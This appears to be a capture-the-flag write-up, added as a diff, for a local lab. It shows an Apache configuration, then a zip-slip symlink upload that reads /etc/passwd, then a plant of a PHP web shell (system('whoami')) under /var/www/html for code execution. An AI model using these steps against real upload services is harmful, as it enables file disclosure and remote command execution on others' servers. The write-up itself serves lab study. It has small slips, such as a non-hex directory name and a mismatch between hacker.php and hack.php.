@@ -1,0 +1,60 @@
+
+      [  TARGET: http://localhost:9091  ]
+
+      - on the apache2.conf file, we get:
+
+          ...
+        <Directory /var/www/>
+                Options Indexes FollowSymLinks                // This allows us to follow symbolic links.
+                AllowOverride None 
+                Require all granted
+        </Directory>
+
+        <Directory "/var/www/html/upload/">
+                AllowOverride None
+                Require all granted
+                Options +Indexes
+        </Directory>
+
+        <Directory ~ "^/var/www/html/upload/[0-9a-fA-F]{32}/.+">
+                AllowOverride None
+                Require all granted
+                ...
+                <FilesMatch ".+\.(html|txt|php)">
+                        Header set Content-Type text/plain
+                </FilesMatch>
+        </Directory>
+
+        <Directory ~ "^/var/www/html/upload/[0-9a-fA-F]{32}/">
+                AllowOverride None
+                Require all granted
+                php_flag engine off
+        </Directory>    
+        
+        ...
+
+        - You have to create a file with symlink: $ ln -s /etc/passwd linkpasswd
+        - After that, you need to zip file:       $ zip -y link.zip linkpasswd
+        => Upload link.zip
+        - Access this: /var/www/html/upload/523a47g4fad24d24gg132d3g3fs6243g/linkpasswd => /etc/passwd => ... CBJS{FAKE_FLAG_FAKE_FLAG} ...
+
+        => Read file with symlink, now change to RCE.
+
+        - Create again linkpasswd but now the path we will set is /var/www/html, because look at this:
+
+              <Directory ~ "^/var/www/html/upload/[0-9a-fA-F]{32}/.+">
+                AllowOverride None
+                Require all granted
+                ...
+                <FilesMatch ".+\.(html|txt|php)">
+                        Header set Content-Type text/plain
+                </FilesMatch>
+              </Directory>
+
+        => we can upload to /var/www/html
+
+        - After successful create and upload linkpasswd:
+            + You have to create linkpasswd folder again and file hacker.php inside, echo this payload to hacker.php: <?php system('whoami'); ?>
+            => zip -r hacker.zip linkpasswd/hacker.php
+
+        After all: curl http://localhost:9091/hack.php => www-data
